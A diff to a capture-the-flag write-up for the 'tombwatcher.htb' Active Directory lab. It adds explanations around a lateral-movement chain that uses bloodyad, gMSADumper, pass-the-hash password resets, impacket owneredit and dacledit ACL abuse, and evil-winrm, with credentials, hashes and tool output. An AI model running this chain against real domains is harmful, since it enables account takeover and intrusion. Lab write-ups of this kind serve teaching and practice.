@@ -299,7 +299,7 @@ Stopped: Thu Sep 24 03:57:20 2026
 
 `alfred:basketball`
 
-## adding alfred to infrastructure
+ adding alfred to infrastructure group:
 
 ```
  bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball add groupMember INFRASTRUCTURE alfred                
@@ -309,7 +309,8 @@ Stopped: Thu Sep 24 03:57:20 2026
 ---
 ### Lateral Movement from alfred to ansible_dev$
 
-reading gmsa NT hash of ansible_dev$
+reading gmsa NT hash of ansible_dev$ after inheriting the privileges of the group:
+
 ```
 python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'             
 Users or groups who can read password for ansible_dev$:
@@ -321,6 +322,8 @@ ansible_dev$:aes128-cts-hmac-sha1-96:f1e40e3681fdae0d4a8eaf0984691157
 
 ### Lateral movement from ansible_dev$ to sam 
 
+ForcePasswordReset ACL is used to create a new password without knowing the previous:
+
 ```
 pth-net rpc password "sam" 'newP@ssword2022' -U "tombwatcher.htb"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"3eca34dd13a85db79c03178b7b149621" -S DC01.tombwatcher.htb
 E_md4hash wrapper called.
@@ -329,6 +332,7 @@ HASH PASS: Substituting user supplied NTLM HASH...
 
 ### Lateral movement from sam to john
 
+Adding ownership to the john object
 ```
 impacket-owneredit -action write -new-owner sam -target john tombwatcher.htb/sam:'newP@ssword2022' -dc-ip 10.129.144.23                   
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -338,9 +342,12 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] - sAMAccountName: Domain Admins
 [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
 [*] OwnerSid modified successfully!
-                                                                                                                    
-┌──(kali㉿kali)-[~/machines/tombwatcher]
-└─$ impacket-dacledit -action write -rights FullControl -principal sam -target john tombwatcher.htb/sam:'newP@ssword2022' -dc-ip 10.129.144.23
+
+```
+
+Setting GenericAll ACL over the john object, and resetting his password:
+```
+impacket-dacledit -action write -rights FullControl -principal sam -target john tombwatcher.htb/sam:'newP@ssword2022' -dc-ip 10.129.144.23
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 /usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
@@ -358,6 +365,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ### User flag
 
+john is member of the remote management use
 ```
  evil-winrm -i tombwatcher.htb -u john -p 'newP@ssword2022'   
                                         
